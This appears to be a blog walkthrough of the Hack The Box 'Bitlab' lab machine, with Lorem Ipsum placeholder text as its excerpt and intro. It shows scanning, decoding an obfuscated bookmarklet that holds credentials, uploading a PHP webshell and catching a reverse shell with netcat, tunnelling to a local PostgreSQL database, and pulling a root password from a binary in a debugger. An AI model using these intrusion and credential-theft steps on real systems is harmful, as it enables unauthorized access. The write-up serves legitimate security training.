---
layout: single
title: Bitlab - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-11-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-bitlab/bitlab_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bitlab/bitlab_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@kali:/opt/htb/machines/bitlab# nmapAutomatorDirb.sh 10.10.10.114 All
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
    |   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
    |_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
    80/tcp open  http    nginx
    | http-robots.txt: 55 disallowed entries (15 shown)
    | / /autocomplete/users /search /api /admin /profile
    | /dashboard /projects/new /groups/new /groups/*/edit /users /help
    |_/s/ /snippets/new /snippets/*/edit
    | http-title: Sign in \xC2\xB7 GitLab
    |_Requested resource was http://bitlab.htb/users/sign_in
    |_http-trane-info: Problem with XML parsing of /evox/about
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB
    + http://10.10.10.114:80/deploy.html (CODE:200|SIZE:2571)
    + http://10.10.10.114:80/explore.html (CODE:200|SIZE:13724)
    + http://10.10.10.114:80/public.html (CODE:200|SIZE:13810)
    + http://10.10.10.114:80/search.html (CODE:200|SIZE:13376)
    + http://10.10.10.114:80/search.php (CODE:200|SIZE:13374)

    NIKTO
    + /.well-known/openid-configuration: OpenID Provider Configuration Information.
    + OSVDB-3092: /search.vts: This might be interesting...
    + OSVDB-3092: /public/: This might be interesting...


2. On the page http://10.10.10.114/help/bookmarks.html we find a bookmark named "Gitlab Login" linking to a weird url.
    javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()

    By looking at it we can see that it's encoded hex, and something else. Decode it using https://malwaredecoder.com/
      javascript:(function(){
      document["getElementById"]("user_login")["value"]= "clave";
      document["getElementById"]("user_password")["value"]= "11des0081x"";

    Our first set of creds - clave:11des0081x

3. The creds don't work for SSH, but they do work on the login-page on port 80. Looking around on the page we find a few things
    .. http://10.10.10.114/root/profile: "TODO: Connect with postgresql"
    .. http://10.10.10.114/snippets/1:
        <?php
        $db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
        $result = pg_query($db_connection, "SELECT * FROM profiles");

    psql is not reachable from our remote machine, maybe this is our way towards user / root from init.

4. We are able to upload files in http://10.10.10.114/root/profile/tree/master, upload a shell (webshell or reverse php)
   Using dirb we can locate the url for our shell. We know that index.php, README.md and developer.jpg are in the same folder.

   DIRB
    + http://bitlab.htb/profile/index.php (CODE:200|SIZE:4184)

   We can now reach our shell(s) by either ..
    http://bitlab.htb/profile/webshell.php
    http://bitlab.htb/profile/rev.php

    root@kali:/opt/htb/machines/bitlab# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.114] 56174
      Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
       20:57:55 up 5 min,  0 users,  load average: 3.04, 1.75, 0.79
      USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
      uid=33(www-data) gid=33(www-data) groups=33(www-data)
      /bin/sh: 0: can't access tty; job control turned off
    $

    Upgrade the shell for ease of management.
      www-data@bitlab:/$

5. Uploading lse.sh and running it shows that postgresql is up and running on it's default port - 5432.
    ================================================================( network )=====
    [*] net000 Services listening only on localhost............................ yes!
    ---
    tcp    LISTEN   0        128             127.0.0.1:3022          0.0.0.0:*
    tcp    LISTEN   0        128             127.0.0.1:5432          0.0.0.0:*

   And OpenSSH 7.2p2 on port 3022.
    www-data@bitlab:/dev/shm$ curl 127.0.0.1:3022
    SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6

6. By default, postgresql is running in Kali Linux. Stop the service, setup a SSH-tunnel and connect using rsql
    root@kali:/opt/htb/machines/bitlab# service postgresql stop

    www-data@bitlab:/srv/apps/profile/.git$ ssh -R 5432:127.0.0.1:5432 p3@10.10.14.10

    root@kali:/opt/htb/machines/bitlab# psql -h 127.0.0.1 -U profiles -d profiles
      Password for user profiles: (profiles)
      psql (12.1 (Debian 12.1-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
      Type "help" for help.
    profiles=>
    profiles=> TABLE profiles;
     id | username |        password
    ----+----------+------------------------
      1 | clave    | c3NoLXN0cjBuZy1wQHNz==
    (1 row)

    Decoding the password gives us "ssh-str0ng-p@ss" however we can't login with that password. Trying the
    encrypted password works tho.

7. Grab user.txt
    root@p3:/opt/htb/machines/bitlab# ssh clave@bitlab.htb
    clave@bitlab.htb's password: (c3NoLXN0cjBuZy1wQHNz==)
      Last login: Thu Nov 28 10:42:18 2019 from 10.10.14.10
    clave@bitlab:~$ cat user.txt
      1e3f****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating the box as user Clave we find RemoteConnection.exe in the home folder. Reading the forums they suggest to study
   the challenge reverse EasyPass. Move the .exe to your Windows box, install Immunity Debugger and open the file.

2. "Search for" > "All referenced test strings" And I found the reference "clave".
    I set a breakpoint on the "MOV" function above the reference clave and run the program again.
    I get following output in my Registers Window:

      EAX 02C63AE0 UNICODE "-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&eD4^""
      ECX 00000000
      EDX 00000033
      EBX 02C63A00 ASCII "-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&eD4^""
      ESP 00CFFA40
      EBP 00CFFAC0
      ESI 02C63A33
      EDI 00CF0022
      EIP 00DC163C RemoteCo.00DC163C
      C 0  ES 002B 32bit 0(FFFFFFFF)
      P 1  CS 0023 32bit 0(FFFFFFFF)
      A 0  SS 002B 32bit 0(FFFFFFFF)
      Z 1  DS 002B 32bit 0(FFFFFFFF)
      S 0  FS 0053 32bit A62000(FFF)
      T 0  GS 002B 32bit 0(FFFFFFFF)
      D 0
      O 0  LastErr ERROR_INSUFFICIENT_BUFFER (0000007A)
      EFL 00000246 (NO,NB,E,BE,NS,PE,GE,LE)
      ST0 empty g
      ST1 empty g
      ST2 empty g
      ST3 empty g
      ST4 empty g
      ST5 empty g
      ST6 empty g
      ST7 empty g
                     3 2 1 0      E S P U O Z D I
      FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
      FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

3. Go back to the Linux-box and ssh to get root.txt
    root@p3:~# ssh root@bitlab.htb
    root@bitlab.htb's password: (Qf7]8YSV.wDNF*[7d?j&eD4^)
    Last login: Fri Sep 13 14:11:14 2019
    root@bitlab:~# cat root.txt
      8d4c****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

PostgreSQL:
  https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546
  https://www.postgresql.org/docs/8.3/app-psql.html

EasyPass:
  https://www.youtube.com/watch?v=zDjut5L_NnY
